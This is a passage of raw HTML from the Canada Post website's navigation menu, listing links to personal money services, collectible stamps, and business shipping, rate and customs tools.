      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/far/business/findARate" target="" alt="">
        <h3 class="submenu-header">Find a rate<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/tools/delivery-standards.page?" class="" target="" alt="">Find a delivery standard</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/tools/delivery-standards.page?" target="" alt="">
        <h3 class="submenu-header">Find a delivery standard<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/track-reperage/en" class="" target="" alt="">Track a package</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/track-reperage/en" target="" alt="">
        <h3 class="submenu-header">Track a package<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" class="" target="" alt="">Find a post office</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/fpo/personal/findpostoffice" target="" alt="">
        <h3 class="submenu-header">Find a post office<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" class="" target="" alt="">Find a postal code</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/info/mc/personal/postalcode/fpc.jsf" target="" alt="">
        <h3 class="submenu-header">Find a postal code<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services.page?" class="parent-link" target="" alt="">Money and government services</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services.page?" target="" alt="">
              <h3 class="submenu-header">Money and government services<span class="open-new-window"></span></h3>
                <p>Learn about money services and permits available at the post office.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money.page?" class="menu-title parent-link" target="" alt="">Send money</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money.page?" target="" alt="">
          <h3 class="submenu-header">Send money<span class="open-new-window"></span></h3>
          <p>Learn about affordable money transfers and cashable money orders.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money/money-orders.page?" class="" target="" alt="">Money orders</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money/money-orders.page?" target="" alt="">
        <h3 class="submenu-header">Money orders<span class="open-new-window"></span></h3>
        <p>Send secure, cashable money orders from the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money/international-money-transfers.page?" class="" target="" alt="">International money transfer (MoneyGram)</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/send-money/international-money-transfers.page?" target="" alt="">
        <h3 class="submenu-header">International money transfer (MoneyGram)<span class="open-new-window"></span></h3>
        <p>Send affordable, international money transfers all over the world.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money.page?" class="menu-title parent-link" target="" alt="">Manage money</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money.page?" target="" alt="">
          <h3 class="submenu-header">Manage money<span class="open-new-window"></span></h3>
          <p>Learn about prepaid cards and ordering foreign currency.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards.page?" class="parent-link" target="" alt="">Prepaid reloadable cards</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards.page?" target="" alt="">
        <h3 class="submenu-header">Prepaid reloadable cards<span class="open-new-window"></span></h3>
        <p>Buy prepaid cards at the post office for shopping and travel.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard.page?" class="parent-link" target="" alt="">Mastercard</a>
          <div class="menu-item-level level4" data-level="5">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard.page?" target="" alt="">
            <h3 class="submenu-header">Mastercard<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/overview.page?" class="" target="" alt="">Get to know your card</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/overview.page?" target="" alt="">Get to know your card</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started.page?" class="" target="" alt="">How to get started</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-to-get-started.page?" target="" alt="">How to get started</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works.page?" class="" target="" alt="">How it works</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/how-it-works.page?" target="" alt="">How it works</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us.page?" class="" target="" alt="">Contact us</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/contact-us.page?" target="" alt="">Contact us</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/faq.page?" class="" target="" alt="">FAQ</a>
      <div class="menu-hide level4">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-cards/mastercard/faq.page?" target="" alt="">FAQ</a>
        <ul>
          
        </ul>              
      </div>
    </li>   
    
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-services-mobile-recharge.page?" class="" target="" alt="">Other prepaid services</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/prepaid-services-mobile-recharge.page?" target="" alt="">
        <h3 class="submenu-header">Other prepaid services<span class="open-new-window"></span></h3>
        <p>Buy calling cards and mobile recharge cards at the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/foreign-currency-delivery.page?" class="" target="" alt="">Foreign cash delivery</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/manage-money/foreign-currency-delivery.page?" target="" alt="">
        <h3 class="submenu-header">Foreign cash delivery<span class="open-new-window"></span></h3>
        <p>Order currency online for delivery to your home or the post office.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/gift-cards.page?" class="menu-title " target="" alt="">Gift cards</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/gift-cards.page?" target="" alt="">
          <h3 class="submenu-header">Gift cards<span class="open-new-window"></span></h3>
          <p>Purchase gift cards at the post office.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/tax-forms-hunting-permit.page?" class="menu-title " target="" alt="">Government forms and permits</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/money-government-services/tax-forms-hunting-permit.page?" target="" alt="">
          <h3 class="submenu-header">Government forms and permits<span class="open-new-window"></span></h3>
          <p>Get migratory bird hunting permits at the post office.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles.page?" class="parent-link" target="" alt="">Collectible stamps and coins</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles.page?" target="" alt="">
              <h3 class="submenu-header">Collectible stamps and coins<span class="open-new-window"></span></h3>
                <p>Learn about collectible stamps and access pictorial cancels.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/stamp-stories.page?" class="menu-title parent-link" target="" alt="">Canadian stamp stories</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/stamp-stories.page?" target="" alt="">
          <h3 class="submenu-header">Canadian stamp stories<span class="open-new-window"></span></h3>
          <p>Tips and ideas on collecting stamps and coins.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/stamp-stories/details-magazine-collections-catalogue.page?" class="" target="" alt="">Details magazine collections catalogue</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/stamp-stories/details-magazine-collections-catalogue.page?" target="" alt="">
        <h3 class="submenu-header">Details magazine collections catalogue<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/suggest-stamp.page?" class="menu-title " target="" alt="">Suggest a stamp</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/suggest-stamp.page?" target="" alt="">
          <h3 class="submenu-header">Suggest a stamp<span class="open-new-window"></span></h3>
          <p>Send us your stamp theme ideas.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/pictorial-cancels.page?" class="menu-title " target="" alt="">Pictorial cancels</a>
          <div class="menu-hide level1">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/personal/collectibles/pictorial-cancels.page?" target="" alt="">
          <h3 class="submenu-header">Pictorial cancels<span class="open-new-window"></span></h3>
          <p>View available postal cancels and which post office offers them.</p>
          </a>
          </div> 
          <ul>
          
          </ul>
        </div>

        </li>
          

    
              </ul>
            </div>
          </li>
    
       
        </ul>
        <ul id="mobile-nav-section-business" class="menu-primary-links " data-sitemap="business">
           
      <div class="menu-overview">
      <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business.page?" target="">
      <h3 class="submenu-header">Business<span class="open-new-window"></span></h3>
      <p>Learn about mailing services for businesses of all sizes.</p>
      </a>
      </div> 
      
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping.page?" class="parent-link" target="" alt="">Shipping</a>
            <div class="menu-item-level level1" data-level="2">
              <div class="menu-overview">
              <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping.page?" target="" alt="">
              <h3 class="submenu-header">Shipping<span class="open-new-window"></span></h3>
                <p>Learn about services and rates for Canadian and international shipping.</p>
              </a>
              </div> 
              <ul>
                
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada.page?" class="menu-title parent-link" target="" alt="">Ship in Canada</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada.page?" target="" alt="">
          <h3 class="submenu-header">Ship in Canada<span class="open-new-window"></span></h3>
          <p>Learn about domestic shipping services to suit your business needs.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship.page?" class="parent-link" target="" alt="">Find a rate and ship</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship.page?" target="" alt="">
        <h3 class="submenu-header">Find a rate and ship<span class="open-new-window"></span></h3>
        <p>Learn about costs for small business and large volume shipping.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
            <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" class="" target="" alt="">Shipping Manager</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/shipping-manager.page?" target="" alt="">
            <h3 class="submenu-header">Shipping Manager<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/est-2.page?" class="" target="" alt="">EST 2.0</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/est-2.page?" target="" alt="">
            <h3 class="submenu-header">EST 2.0<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare.page?" class="parent-link" target="" alt="">Compare shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services<span class="open-new-window"></span></h3>
        <p>Learn about domestic shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/regular.page?" class="" target="" alt="">Regular Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/regular.page?" target="" alt="">
            <h3 class="submenu-header">Regular Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/expedited.page?" class="" target="" alt="">Expedited Parcel</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/expedited.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/xpresspost.page?" class="" target="" alt="">Xpresspost</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/xpresspost.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/priority.page?" class="" target="" alt="">Priority</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/canada/compare/priority.page?" target="" alt="">
            <h3 class="submenu-header">Priority<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions.page?" class="parent-link" target="" alt="">View restrictions</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled item mail restrictions by country.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions/cannabis.page?" class="" target="" alt="">Cannabis</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions/cannabis.page?" target="" alt="">
            <h3 class="submenu-header">Cannabis<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/compare-shipping-tools.page?" class="" target="" alt="">Choose a shipping tool</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/compare-shipping-tools.page?" target="" alt="">
        <h3 class="submenu-header">Choose a shipping tool<span class="open-new-window"></span></h3>
        <p>Compare our 3 shipping tools to find the tool for your business.</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/third-party-shipping-software.page?" class="" target="" alt=""> Third-party shipping software</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/third-party-shipping-software.page?" target="" alt="">
        <h3 class="submenu-header"> Third-party shipping software<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
    
          </ul>
        </div>

        </li>
          

    
          <li>
            <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international.page?" class="menu-title parent-link" target="" alt="">Ship internationally</a>
          <div class="menu-item-level level1" data-level="3">
          <div class="menu-overview">
          <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international.page?" target="" alt="">
          <h3 class="submenu-header">Ship internationally<span class="open-new-window"></span></h3>
          <p>Learn about international shipping services for your business needs.</p>
          </a>
          </div> 
          <ul>
                    
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship.page?" class="parent-link" target="" alt="">Find a rate and ship</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship.page?" target="" alt="">
        <h3 class="submenu-header">Find a rate and ship<span class="open-new-window"></span></h3>
        <p>Learn about costs for small business and large volume shipping.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" class="" target="" alt="">Snap Ship</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/snap-ship.page?" target="" alt="">
            <h3 class="submenu-header">Snap Ship<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/est-2.page?" class="" target="" alt="">EST 2.0</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/find-rates-ship/est-2.page?" target="" alt="">
            <h3 class="submenu-header">EST 2.0<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare.page?" class="parent-link" target="" alt="">Compare shipping services</a>
      <div class="menu-item-level level4" data-level="4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare.page?" target="" alt="">
        <h3 class="submenu-header">Compare shipping services<span class="open-new-window"></span></h3>
        <p>Learn about U.S. and international shipping speeds and features.</p>
        </a>
        </div> 
        <ul>
          
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/small-packet-usa.page?" class="" target="" alt="">Small Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/small-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/small-packet-international.page?" class="" target="" alt="">Small Packet International – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/small-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Small Packet International – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/tracked-packet-usa.page?" class="" target="" alt="">Tracked Packet – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/tracked-packet-usa.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/tracked-packet-international.page?" class="" target="" alt="">Tracked Packet – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/tracked-packet-international.page?" target="" alt="">
            <h3 class="submenu-header">Tracked Packet – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/expedited-parcel-usa.page?" class="" target="" alt="">Expedited Parcel – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/expedited-parcel-usa.page?" target="" alt="">
            <h3 class="submenu-header">Expedited Parcel – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/international-parcel.page?" class="" target="" alt="">International Parcel – Air or Surface</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/international-parcel.page?" target="" alt="">
            <h3 class="submenu-header">International Parcel – Air or Surface<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/xpresspost-usa.page?" class="" target="" alt="">Xpresspost – USA</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/xpresspost-usa.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – USA<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/xpresspost-international.page?" class="" target="" alt="">Xpresspost – International</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/xpresspost-international.page?" target="" alt="">
            <h3 class="submenu-header">Xpresspost – International<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
          <li>
          <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/priority-worldwide.page?" class="" target="" alt="">Priority Worldwide</a>
          <div class="menu-hide level4">
            <div class="menu-overview">
            <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/international/compare/priority-worldwide.page?" target="" alt="">
            <h3 class="submenu-header">Priority Worldwide<span class="open-new-window"></span></h3>
            <p></p>
            </a>
            </div> 
            <ul>
            
            </ul>
        </div>
        </li> 
    
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions.page?" class="" target="" alt="">View restrictions</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/cpc/en/business/shipping/restrictions.page?" target="" alt="">
        <h3 class="submenu-header">View restrictions<span class="open-new-window"></span></h3>
        <p>Learn about non-mailable and controlled restrictions by country</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/wtz/business/landedCost" class="" target="" alt="">Estimate duties and taxes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/wtz/business/landedCost" target="" alt="">
        <h3 class="submenu-header">Estimate duties and taxes<span class="open-new-window"></span></h3>
        <p>Estimate duties and taxes</p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/wtz/business/findHsCode" class="" target="" alt="">Find customs codes</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/wtz/business/findHsCode" target="" alt="">
        <h3 class="submenu-header">Find customs codes<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
      <a href="https://www.canadapost-postescanada.ca/information/app/cdc" class="" target="" alt="">Complete customs form</a>
      <div class="menu-hide level4">
      <div class="menu-overview">
        <a class="parent-title" href="https://www.canadapost-postescanada.ca/information/app/cdc" target="" alt="">
        <h3 class="submenu-header">Complete customs form<span class="open-new-window"></span></h3>
        <p></p>
        </a>
        </div> 
        <ul>
          
        </ul>
      </div>
    </li>    
              
    <li>
